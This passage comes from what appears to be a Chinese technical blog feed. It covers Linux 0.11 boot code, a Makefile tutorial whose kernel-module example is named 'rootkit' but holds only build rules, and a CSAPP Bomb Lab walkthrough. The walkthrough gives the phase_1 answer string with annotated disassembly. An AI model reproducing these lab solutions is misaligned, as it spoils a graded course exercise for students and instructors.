段开始的64k 代码移动完？</span><br><span class="hljs-keyword">jz</span>end_move<br><span class="hljs-keyword">mov</span><span class="hljs-built_in">ds</span>,<span class="hljs-built_in">ax</span><span class="hljs-comment">;// ds:si -&gt; 源地址(初始为1000:0)</span><br><span class="hljs-keyword">sub</span><span class="hljs-built_in">di</span>,<span class="hljs-built_in">di</span><br><span class="hljs-keyword">sub</span><span class="hljs-built_in">si</span>,<span class="hljs-built_in">si</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">cx</span>,<span class="hljs-number">8000h</span><span class="hljs-comment">;// 移动8000 字（64k 字节）。</span><br><span class="hljs-keyword">rep</span> <span class="hljs-keyword">movsw</span><br><span class="hljs-keyword">jmp</span>do_move<br></code></pre></td></tr></table></figure><p>为了给后面的保护模式做准备，setup程序还要对中断描述符表寄存器（IDTR）和全局描述符表寄存器（GDTR）进行初始化设置</p><p>之后，设置 CPU 的控制寄存器 CR0（也称机器状态字），从而进入 32 位保护模式运行，并跳<br>转到位于 system 模块最前面部分的 head.s 程序继续运行</p><ul><li>打开A20，实现4GB寻址</li><li>将CR0寄存器的第0位（PE）置零，将处理器工作方式设置为保护模式</li></ul><h1 id="4-head程序"><a href="#4-head程序" class="headerlink" title="4.head程序"></a>4.head程序</h1><p>之前提到system模块会被复制到0x00000开始的位置，head程序其实是system模块的一部分，而且是最开始的部分，0x00000其实也是head程序的起始地址。head.s 与前面bootsect.s和setup.s汇编不同，使用的是AT&amp;T格式的汇编</p><ul><li>加载各个数据段寄存器，重新设置中断描述符表 idt，共 256 项，并使各个表项均指向一个只报错误的哑中断程序</li><li>重新设置全局描述符表 gdt</li><li>使用物理地址 0 与 1M 开始处的内容相比较的方法，检测 A20 地址线是否已真的开启</li><li>设置管理内存的分页处理机制，将页目录表放在绝对物理地址 0 开始处紧随后面放置共可寻址 16MB 内存的 4 个页表，并分别设置它们的表项</li><li>最后利用返回指令将预先放置在堆栈中的/init/main.c 程序的入口地址弹出，去运行 main()程序</li></ul><h1 id="实模式与保护模式"><a href="#实模式与保护模式" class="headerlink" title="实模式与保护模式"></a>实模式与保护模式</h1><p>实模式：</p><ul><li>寻址<ul><li>段寄存器存放段的基地址，和偏移值共同确定内存地址，此内存地址即是真实物理地址，最大寻址空间是20位，1MB</li></ul></li><li>中断机制<ul><li>使用中断向量表，其实位置在0x00000，位置固定</li></ul></li></ul><p>保护模式：</p><ul><li>寻址  <ul><li>段寄存器存放段描述符表中某一项的索引，索引值所指向的段描述符项包含以下信息：<ul><li>要寻址的内存段的基地址</li><li>段的最大长度值</li><li>段的访问级别等信息</li></ul></li><li>最大寻址空间是32位，4GB</li></ul></li><li>中断机制<ul><li>使用中断描述符表（IDT），可以由操作系统灵活安排，通过IDTR寄存器定位位置</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>Linux内核</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Makefile：一个简单的入门</title>
    <link href="/p/b7f87e4d/"/>
    <url>/p/b7f87e4d/</url>
    
    <content type="html"><![CDATA[<p><img src="/image/CMake-Logo.png"></p><h1 id="为什么使用Makefile"><a href="#为什么使用Makefile" class="headerlink" title="为什么使用Makefile"></a>为什么使用Makefile</h1><p>Makefile可以使构建更方便、减少不必要的构建</p><p>想象以下情景，目标文件main的依赖关系如下：<br><img src="/image/Pastedimage20220912172957.png"><br>那么可以使用如下命令行进行编译：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">gcc <span class="hljs-selector-tag">main</span><span class="hljs-selector-class">.c</span> stack<span class="hljs-selector-class">.c</span> maze<span class="hljs-selector-class">.c</span> -o main<br></code></pre></td></tr></table></figure><p>那么会出现以下状况：</p><ul><li>即使是仅仅改变了某一个文件的一行代码，那么所有的.o文件都需要重新生成，然后通过链接得到目标文件，这个开销是巨大的<ul><li>一个极端情景：一个大型的软件项目往往由上千个源文件组成，全部编译一遍需要几个小时</li></ul></li><li>如果有多个.o文件，我们修改了某一个文件（比如.h或者.c文件），那么会影响多个.o文件，因此我们需要重新编译这些.o文件，那么管理他们的依赖是十分麻烦的</li></ul><p>Makefile应运而生</p><h1 id="Makefile格式"><a href="#Makefile格式" class="headerlink" title="Makefile格式"></a>Makefile格式</h1><p>在目录下必须有一个Makefile文件，该文件名大小写敏感，里面内容类似下面：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;target&gt; : &lt;prerequisites&gt; <br>[tab]  &lt;commands&gt; <span class="hljs-comment">#hello，thank you</span><br></code></pre></td></tr></table></figure><p>其中：</p><ul><li>target是目标文件</li><li>prerequisites是前置条件</li><li>如果要更新目标，那么需要更新所有前置条件</li><li>target和prerequisites可以有多个，用空格分开</li><li>command前面必须是tab，这些command将会被shell执行</li><li>#是注释</li></ul><p>一个简单的Makefile程序：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">blah: </span><span class="hljs-keyword">blah.o</span><br><span class="hljs-keyword"></span><br>cc <span class="hljs-keyword">blah.o </span>-o <span class="hljs-keyword">blah </span><span class="hljs-comment"># Runs third</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">blah.o:</span> <span class="hljs-keyword">blah.c</span><br><span class="hljs-keyword"></span><br>cc -c <span class="hljs-keyword">blah.c </span>-o <span class="hljs-keyword">blah.o </span><span class="hljs-comment"># Runs second</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">blah.c:</span><br><br>echo <span class="hljs-string">&quot;int main() &#123; return 0; &#125;&quot;</span> &gt; <span class="hljs-keyword">blah.c </span><span class="hljs-comment"># Runs first</span><br></code></pre></td></tr></table></figure><p>在下面的情况下，执行make会更新目标文件：</p><ul><li>当前目录没有目标文件</li><li>前置条件需要更新</li><li>前置条件修改时间晚于目标文件（目标文件依赖于前置条件，而前置条件被修改了，那么目标文件需要更新）</li></ul><p>在编译过程中，经常有一些过程文件，比如二进制文件，那么我们可以清除这些二进制文件，保留源文件，以便于下次make</p><p>make规则的一个示例：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">clean:<br>@<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;cleanning project&quot;</span><br>-rm main *<span class="hljs-string">.o</span><br>@<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;clean completed&quot;</span><br></code></pre></td></tr></table></figure><ul><li>@表示这行语句不被输出，如果不加@那么会输出这行语句本身</li><li>-表示这行语句的执行错误也要忽略。一般rm命令会加-，因为要删除的文件或许不存在</li></ul><p>至此我们发现Makefile中已经有了很多目标文件了，比如main和clean，那么如果我们要指定构建target，那么只需要在命令行中输入make target即可；假设没有指定，那么会默认执行Makefile文件的第一个目标</p><p>如果文件夹中存在clean这个文件名，那么再次执行make clean并不会执行，因为它认为该文件已存在。为了防止这种情况发生，可以通过.PHONY声明clean是”伪目标”</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">.PHONY</span>: clean<br><br>clean:<br>@<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;cleanning project&quot;</span><br>-rm main *<span class="hljs-string">.o</span><br>@<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;clean completed&quot;</span><br></code></pre></td></tr></table></figure><p>Makefile中约定俗成的名字：</p><blockquote><p>all，执行主要的编译工作，通常用作缺省目标。<br>install，执行编译后的安装工作，把可执行文件、配置文件、文档等分别拷到不同的安装目录。<br>clean，删除编译生成的二进制文件。<br>distclean，不仅删除编译生成的二进制文件，也删除其它生成的文件，例如配置文件和格式转换后的文档，执行make distclean之后应该清除所有这些文件，只留下源文件。</p></blockquote><h1 id="变量与规则"><a href="#变量与规则" class="headerlink" title="变量与规则"></a>变量与规则</h1><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs makefile">foo = <span class="hljs-variable">$(bar)</span><br>bar = Huh?<br><span class="hljs-section">all:</span><br>@echo <span class="hljs-variable">$(foo)</span><br></code></pre></td></tr></table></figure><ul><li>最终会打印出Huh？</li><li>这种赋值方式，在make遇到变量定义时不会立即展开</li><li>如果想要立即展开，可以使用<code>a:=b</code>的形式</li><li>+=可以追加</li></ul><p>Makefile中有一些特殊变量，比如：</p><ul><li>$@表示规则中的目标文件（target）</li><li>$&lt;表示规则中第一个prerequisites</li><li>$?表示规则中所有比目标文件新的prerequisites</li><li>$^规则中的所有prerequisites</li></ul><p>使用这些变量，可以对Makefile进行改写</p><p>版本1：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-tag">main</span>: <span class="hljs-selector-tag">main</span><span class="hljs-selector-class">.o</span> stack<span class="hljs-selector-class">.o</span> maze<span class="hljs-selector-class">.o</span><br>gcc <span class="hljs-selector-tag">main</span><span class="hljs-selector-class">.o</span> stack<span class="hljs-selector-class">.o</span> maze<span class="hljs-selector-class">.o</span> -o main<br></code></pre></td></tr></table></figure><p>版本2：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-tag">main</span>: <span class="hljs-selector-tag">main</span><span class="hljs-selector-class">.o</span> stack<span class="hljs-selector-class">.o</span> maze<span class="hljs-selector-class">.o</span><br>gcc $^ -o $@<br></code></pre></td></tr></table></figure><p>常见变量：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">AR<br>静态库打包命令的名字，缺省值是ar。<br>ARFLAGS<br>静态库打包命令的选项，缺省值是rv。<br>AS<br>汇编器的名字，缺省值是<span class="hljs-keyword">as</span>。<br>ASFLAGS<br>汇编器的选项，没有定义。<br>CC<br>C编译器的名字，缺省值是cc。<br>CFLAGS<br>C编译器的选项，没有定义。<br>CXX<br>C++编译器的名字，缺省值是g++。<br>CXXFLAGS<br>C++编译器的选项，没有定义。<br>CPP<br>C预处理器的名字，缺省值是<span class="hljs-constructor">$(CC)</span> -E。<br>CPPFLAGS<br>C预处理器的选项，没有定义。<br>LD<br>链接器的名字，缺省值是ld。<br>LDFLAGS<br>链接器的选项，没有定义。<br>TARGET_ARCH<br>和目标平台相关的命令行选项，没有定义。<br>OUTPUT_OPTION<br>输出的命令行选项，缺省值是-o $@。<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LINK</span>.</span></span>o<br>把.o文件链接在一起的命令行，缺省值是<span class="hljs-constructor">$(CC)</span> <span class="hljs-constructor">$(LDFLAGS)</span> <span class="hljs-constructor">$(TARGET_ARCH)</span>。<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LINK</span>.</span></span>c<br>把.c文件链接在一起的命令行，缺省值是<span class="hljs-constructor">$(CC)</span> <span class="hljs-constructor">$(CFLAGS)</span> <span class="hljs-constructor">$(CPPFLAGS)</span> <span class="hljs-constructor">$(LDFLAGS)</span><br><span class="hljs-constructor">$(TARGET_ARCH)</span>。<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LINK</span>.</span></span>cc<br>把.cc文件（C++源文件）链接在一起的命令行，缺省值是<span class="hljs-constructor">$(CXX)</span> <span class="hljs-constructor">$(CXXFLAGS)</span><br><span class="hljs-constructor">$(CPPFLAGS)</span> <span class="hljs-constructor">$(LDFLAGS)</span> <span class="hljs-constructor">$(TARGET_ARCH)</span>。<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">COMPILE</span>.</span></span>c<br>编译.c文件的命令行，缺省值是<span class="hljs-constructor">$(CC)</span> <span class="hljs-constructor">$(CFLAGS)</span> <span class="hljs-constructor">$(CPPFLAGS)</span> <span class="hljs-constructor">$(TARGET_ARCH)</span> -c。<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">COMPILE</span>.</span></span>cc<br>编译.cc文件的命令行，缺省值是<span class="hljs-constructor">$(CXX)</span> <span class="hljs-constructor">$(CXXFLAGS)</span> <span class="hljs-constructor">$(CPPFLAGS)</span> <span class="hljs-constructor">$(TARGET_ARCH)</span> -c。<br>RM<br>删除命令的名字，缺省值是rm -f。<br></code></pre></td></tr></table></figure><p>make -p查看Makefile的隐藏规则</p><h1 id="依赖关系"><a href="#依赖关系" class="headerlink" title="依赖关系"></a>依赖关系</h1><ul><li><code>gcc -M main.c</code>可以列出目标文件和源文件的依赖关系，包括系统头文件</li><li><code>gcc -MM *.c</code>在上面的基础上不列出系统头文件</li></ul><h1 id="一个内核驱动的Makefile实例"><a href="#一个内核驱动的Makefile实例" class="headerlink" title="一个内核驱动的Makefile实例"></a>一个内核驱动的Makefile实例</h1><ul><li>-j $(nrpoc) ：指定处理器数量</li><li>-C $(LINUX_KERNAL_PATH) ：在内核源码路径执行Makefile</li><li>M=$(CURRENT_PATH) modules ：以内核为基础编译模块的时候，指定目录查找模块源码</li><li>all：make的缺省目标</li><li>@表示这行语句不被输出，如果不加@那么会输出这行语句本身<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs makefile">TARGET=rootkit<br>OBJ=<span class="hljs-variable">$(TARGET)</span>.o<br>MODULE=<span class="hljs-variable">$(TARGET)</span>.ko <br>obj-m+=<span class="hljs-variable">$(OBJ)</span> <br><br>EXTRA_CFLAGS+=-g -O0 <span class="hljs-comment"># 编译参数</span><br>CURRENT_PATH:=<span class="hljs-variable">$(<span class="hljs-built_in">shell</span> pwd)</span> <span class="hljs-comment">#当前路径</span><br>LINUX_KERNAL:=<span class="hljs-variable">$(<span class="hljs-built_in">shell</span> uname -r)</span> <span class="hljs-comment">#内核版本号</span><br>LINUX_KERNAL_PATH:=/lib/modules/<span class="hljs-variable">$(LINUX_KERNAL)</span>/build<br><br><br><span class="hljs-section">all:rootkit </span><br><br><span class="hljs-section">rootkit:</span><br>make -j <span class="hljs-variable">$(nrpoc)</span>-C <span class="hljs-variable">$(LINUX_KERNAL_PATH)</span> M=<span class="hljs-variable">$(CURRENT_PATH)</span> modules <br><span class="hljs-section">install:</span><br><span class="hljs-comment"># 安装模块</span><br>@sudo insmod <span class="hljs-variable">$(CURRENT_PATH)</span>/<span class="hljs-variable">$(MODULE)</span><br><span class="hljs-comment"># 卸载模块</span><br>@sudo rmmod <span class="hljs-variable">$(CURRENT_PATH)</span>/<span class="hljs-variable">$(MODULE)</span><br><br><span class="hljs-section">clean:</span><br>make -C <span class="hljs-variable">$(LINUX_KERNAL_PATH)</span> M=<span class="hljs-variable">$(CURRENT_PATH)</span> clean<br><br><span class="hljs-meta"><span class="hljs-meta-keyword">.PHONY</span>:all install clean rootkit</span><br></code></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    <categories>
      
      <category>Makefile</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP-lab2：Bomb-lab</title>
    <link href="/p/44962f68/"/>
    <url>/p/44962f68/</url>
    
    <content type="html"><![CDATA[<h1 id="先导知识"><a href="#先导知识" class="headerlink" title="先导知识"></a>先导知识</h1><ul><li>AT&amp;T格式的x86汇编</li><li>gdb调试工具的使用</li></ul><p>函数参数的压栈顺序：</p><ul><li>rdi</li><li>rsi</li><li>rdx</li><li>rcx</li><li>r8</li><li>r9</li></ul><p>命令速记：</p><ul><li>list，简写为l<ul><li>输出源代码，默认为十行</li><li>l n ： 输出第n行前后的代码</li><li>l function ： 输出函数function前后的代码</li></ul></li><li>break，简写为b<ul><li>b 行号：在某一行设置断点</li><li>b 函数：在函数入口设置断点</li></ul></li><li>run运行程序并在断点处停止</li><li>next往后执行一行语句</li><li>backtrace查看函数调用的栈帧</li><li>p打印变量的值或者地址（print），类似的还有x命令（examine）</li><li>info locals查看当前栈帧局部变量的值</li><li>info registers可以查看当前寄存器的值</li><li>打印单个寄存器的值<ul><li>i registers eax</li><li>p $eax</li></ul></li><li>display + 变量名 可以每次停下来的时候自动打印变量的值</li><li>直接敲回车键：重复上一条命令</li><li>layout命令可以拆分窗口<ul><li>layout regs显示寄存器的值的独立窗口</li><li>layout asm显示汇编的独立窗口</li><li>ctrl+x 1 单窗口模式</li><li>ctrl+x 2 双窗口模式</li><li>ctrl+x a回到默认的gdb模式</li></ul></li></ul><p><a href="https://github.com/hellogcc/100-gdb-tips/blob/master/src/index.md">100个gdb小技巧</a></p><h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><ul><li>得到汇编代码<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">objdump -d <span class="hljs-keyword">bomb </span>&gt;&gt; <span class="hljs-keyword">bomb.s</span><br><span class="hljs-keyword"></span><br>less <span class="hljs-keyword">bomb.s</span><br></code></pre></td></tr></table></figure></li><li>ssh到服务器</li><li>tmux进行分屏，一边是汇编代码一边是gdb调试</li></ul><h1 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h1><ul><li>strings_not_equal有两个参数，第一个是你所输入的字符串的首地址(rdi)，第二个是正确的字符串的首地址(rsi)<ul><li>strings_not_equal(input_string,correct_string)</li><li>如果两个个字符串是相等的，那么eax作为函数的返回值将会是0</li></ul></li><li>可以使用x/s 0x402400去观察这个地址的值是什么，可以看到是一个字符串</li><li>得到答案：<code>Border relations with Canada have never been better.</code><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0000000000400ee0</span> &lt;phase_<span class="hljs-number">1</span>&gt;:<br>  <span class="hljs-attribute">400ee0</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> ec <span class="hljs-number">08</span>          sub    $<span class="hljs-number">0</span>x<span class="hljs-number">8</span>,%rsp  # 给栈分配空间<br>  <span class="hljs-attribute">400ee4</span>:be <span class="hljs-number">00</span> <span class="hljs-number">24</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">402400</span>,%esi # rdi保存第一个参数，rsi保存第二个参数，这里是为strings_not_equal函数准备参数<br>  <span class="hljs-attribute">400ee9</span>:e<span class="hljs-number">8</span> <span class="hljs-number">4</span>a <span class="hljs-number">04</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">401338</span> &lt;strings_not_equal&gt;<br>  <span class="hljs-attribute">400eee</span>:<span class="hljs-number">85</span> c<span class="hljs-number">0</span>                test   %eax,%eax   # test a,b 是a与b做与运算的意思<br>  <span class="hljs-attribute">400ef0</span>:<span class="hljs-number">74</span> <span class="hljs-number">05</span>                je     <span class="hljs-number">400</span>ef<span class="hljs-number">7</span> &lt;phase_<span class="hljs-number">1</span>+<span class="hljs-number">0</span>x<span class="hljs-number">17</span>&gt; # je/jz 是当运算结果为<span class="hljs-number">0</span>（ZF标志为<span class="hljs-number">1</span>）时跳转。test和je一起使用是为了检测eax是不是<span class="hljs-number">0</span><br>  <span class="hljs-attribute">400ef2</span>:e<span class="hljs-number">8</span> <span class="hljs-number">43</span> <span class="hljs-number">05</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-attribute">400ef7</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c<span class="hljs-number">4</span> <span class="hljs-number">08</span>          add    $<span class="hljs-number">0</span>x<span class="hljs-number">8</span>,%rsp<br>  <span class="hljs-attribute">400efb</span>:c<span class="hljs-number">3</span>                   retq   <br></code></pre></td></tr></table></figure>strings_not_equal函数的具体实现<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0000000000401338</span> &lt;strings_not_equal&gt;: # %rdi保存第一个参数 %rsi保存第二个参数 %rdx保存第三个参数<br>  <span class="hljs-attribute">401338</span>:<span class="hljs-number">41</span> <span class="hljs-number">54</span>                push   %r<span class="hljs-number">12</span><br>  <span class="hljs-attribute">40133a</span>:<span class="hljs-number">55</span>                   push   %rbp<br>  <span class="hljs-attribute">40133b</span>:<span class="hljs-number">53</span>                   push   %rbx<br>  <span class="hljs-attribute">40133c</span>:<span class="hljs-number">48</span> <span class="hljs-number">89</span> fb             mov    %rdi,%rbx #将我们输入的字符串的地址赋给rbx，这里也是下面string_length函数的参数<br>  <span class="hljs-attribute">40133f</span>:<span class="hljs-number">48</span> <span class="hljs-number">89</span> f<span class="hljs-number">5</span>             mov    %rsi,%rbp #将答案的字符串的地址赋给rbp。这里赋值的目的是为了给下面的函数调用腾出寄存器<br>  <span class="hljs-attribute">401342</span>:e<span class="hljs-number">8</span> d<span class="hljs-number">4</span> ff ff ff       callq  <span class="hljs-number">40131</span>b &lt;string_length&gt;<br>  <span class="hljs-attribute">401347</span>:<span class="hljs-number">41</span> <span class="hljs-number">89</span> c<span class="hljs-number">4</span>             mov    %eax,%r<span class="hljs-number">12</span>d #将string_length函数的返回值赋给r<span class="hljs-number">12</span>d<br>  <span class="hljs-attribute">40134a</span>:<span class="hljs-number">48</span> <span class="hljs-number">89</span> ef             mov    %rbp,%rdi #桢指针赋给rdi，也即是答案的字符串的指针赋给rdi，这里是计算出答案的字符串的长度<br>  <span class="hljs-attribute">40134d</span>:e<span class="hljs-number">8</span> c<span class="hljs-number">9</span> ff ff ff       callq  <span class="hljs-number">40131</span>b &lt;string_length&gt;<br>  <span class="hljs-attribute">401352</span>:ba <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">1</span>,%edx<br>  <span class="hljs-attribute">401357</span>:<span class="hljs-number">41</span> <span class="hljs-number">39</span> c<span class="hljs-number">4</span>             cmp    %eax,%r<span class="hljs-number">12</span>d#将答案的字符串的长度与我们的输入的字符串的长度进行比较<br>  <span class="hljs-attribute">40135a</span>:<span class="hljs-number">75</span> <span class="hljs-number">3</span>f                jne    <span class="hljs-number">40139</span>b &lt;strings_not_equal+<span class="hljs-number">0</span>x<span class="hljs-number">63</span>&gt;<br>  <span class="hljs-attribute">40135c</span>:<span class="hljs-number">0</span>f b<span class="hljs-number">6</span> <span class="hljs-number">03</span>             movzbl (%rbx),%eax #将我们输入的字符串的地址赋给eax<br>  <span class="hljs-attribute">40135f</span>:<span class="hljs-number">84</span> c<span class="hljs-number">0</span>                test   %al,%al#检测al的值是不是<span class="hljs-number">0</span><br>  <span class="hljs-attribute">401361</span>:<span class="hljs-number">74</span> <span class="hljs-number">25</span>                je     <span class="hljs-number">401388</span> &lt;strings_not_equal+<span class="hljs-number">0</span>x<span class="hljs-number">50</span>&gt;#是<span class="hljs-number">0</span>就跳到<span class="hljs-number">401388</span><br>  <span class="hljs-attribute">401363</span>:<span class="hljs-number">3</span>a <span class="hljs-number">45</span> <span class="hljs-number">00</span>             cmp    <span class="hljs-number">0</span>x<span class="hljs-number">0</span>(%rbp),%al#将答案字符串第一个字节与al进行比对<br>  <span class="hljs-attribute">401366</span>:<span class="hljs-number">74</span> <span class="hljs-number">0</span>a                je     <span class="hljs-number">401372</span> &lt;strings_not_equal+<span class="hljs-number">0</span>x<span class="hljs-number">3</span>a&gt;#如果相等就跳到<span class="hljs-number">401372</span><br>  <span class="hljs-attribute">401368</span>:eb <span class="hljs-number">25</span>                jmp    <span class="hljs-number">40138</span>f &lt;strings_not_equal+<span class="hljs-number">0</span>x<span class="hljs-number">57</span>&gt;<br>  <span class="hljs-attribute">40136a</span>:<span class="hljs-number">3</span>a <span class="hljs-number">45</span> <span class="hljs-number">00</span>             cmp    <span class="hljs-number">0</span>x<span class="hljs-number">0</span>(%rbp),%al<br>  <span class="hljs-attribute">40136d</span>:<span class="hljs-number">0</span>f <span class="hljs-number">1</span>f <span class="hljs-number">00</span>             nopl   (%rax)<br>  <span class="hljs-attribute">401370</span>:<span class="hljs-number">75</span> <span class="hljs-number">24</span>                jne    <span class="hljs-number">401396</span> &lt;strings_not_equal+<span class="hljs-number">0</span>x<span class="hljs-number">5</span>e&gt;<br>  <span class="hljs-attribute">401372</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c<span class="hljs-number">3</span> <span class="hljs-number">01</span>          add    $<span class="hljs-number">0</span>x<span class="hljs-number">1</span>,%rbx#rbx加到下一个字节<br>  <span class="hljs-attribute">401376</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c<span class="hljs-number">5</span> <span class="hljs-number">01</span>          add    $<span class="hljs-number">0</span>x<span class="hljs-number">1</span>,%rbp#rbp加到下一个字节<br>  <span class="hljs-attribute">40137a</span>:<span class="hljs-number">0</span>f b<span class="hljs-number">6</span> <span class="hljs-number">03</span>             movzbl (%rbx),%eax#把rbx对应内存的值赋给eax<br>  <span class="hljs-attribute">40137d</span>:<span class="hljs-number">84</span> c<span class="hljs-number">0</span>                test   %al,%al#看al是不是<span class="hljs-number">0</span>，<span class="hljs-number">0</span>说明到了字符串末尾处<br>  <span class="hljs-attribute">40137f</span>:<span class="hljs-number">75</span> e<span class="hljs-number">9</span>                jne    <span class="hljs-number">40136</span>a &lt;strings_not_equal+<span class="hljs-number">0</span>x<span class="hljs-number">32</span>&gt;<br>  <span class="hljs-attribute">401381</span>:ba <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">0</span>,%edx<br>  <span class="hljs-attribute">401386</span>:eb <span class="hljs-number">13</span>                jmp    <span class="hljs-number">40139</span>b &lt;strings_not_equal+<span class="hljs-number">0</span>x<span class="hljs-number">63</span>&gt;<br>  <span class="hljs-attribute">401388</span>:ba <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">0</span>,%edx<br>  <span class="hljs-attribute">40138d</span>:eb <span class="hljs-number">0</span>c                jmp    <span class="hljs-number">40139</span>b &lt;strings_not_equal+<span class="hljs-number">0</span>x<span class="hljs-number">63</span>&gt;<br>  <span class="hljs-attribute">40138f</span>:ba <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span 